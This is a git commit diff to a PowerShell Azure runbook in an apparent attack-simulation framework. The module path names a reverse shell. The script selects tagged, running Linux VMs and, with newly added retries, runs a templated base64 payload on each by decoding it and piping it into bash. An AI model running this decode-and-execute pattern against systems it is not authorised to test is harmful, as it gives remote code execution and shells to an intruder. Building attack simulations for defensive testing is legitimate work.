fc030143c36c47569b90adc240c9d7f387e7d19a
credibleforce <jamiefrasermcmurray@gmail.com>
2023-05-01 09:35:26 -0700

    update

--- terraform/modules/attack/simulate/azure/modules/runbook/connect-reverse-shell/runbooks/powershell/RunCommand.ps1
+++ terraform/modules/attack/simulate/azure/modules/runbook/connect-reverse-shell/runbooks/powershell/RunCommand.ps1
@@ -14,15 +14,30 @@ Write-Output "Account ID of current context: " $AzureContext.Account.Id
 
 #Get all Azure VMs which are in running state and are running Windows
 $Jobs = @{}
+$retryLimit = 3
+
 Get-AzVM -ResourceGroupName $resourceGroup -status | Where-Object { `
     $_.PowerState -eq "VM running" `
     -and $_.StorageProfile.OSDisk.OSType -eq "Linux" `
     -and $_.Tags.Keys -contains "${ tag }" `
     -and $_.Tags["${ tag }"] -eq "true" `
 } | ForEach-Object {
-    Invoke-AzVMRunCommand `
-                -ResourceGroupName $resourceGroup `
-                -VMName $_.name `
-                -CommandId 'RunShellScript' `
-                -ScriptString "echo '${ base64_payload }' | tee /tmp/payload_${ module_name } | base64 -d | /bin/bash - &"
+    
+    for ($i=1; $i -le $retryLimit; $i++){
+        try {
+            Invoke-AzVMRunCommand `
+                    -ResourceGroupName $resourceGroup `
+                    -VMName $_.name `
+                    -CommandId 'RunShellScript' `
+                    -ScriptString "echo '${ base64_payload }' | tee /tmp/payload_${ module_name } | base64 -d | /bin/bash - &"
+            Write-Output "Job started successfully."
+            break
+        }
+        catch {
+            $ErrorMessage = "Error connecting to Azure: " + $_.Exception.message
+            Write-Error $ErrorMessage
+            Write-Output "Will retry again in 5 minutes..."
+            Start-Sleep -Seconds 300
+        }
+    }
 }
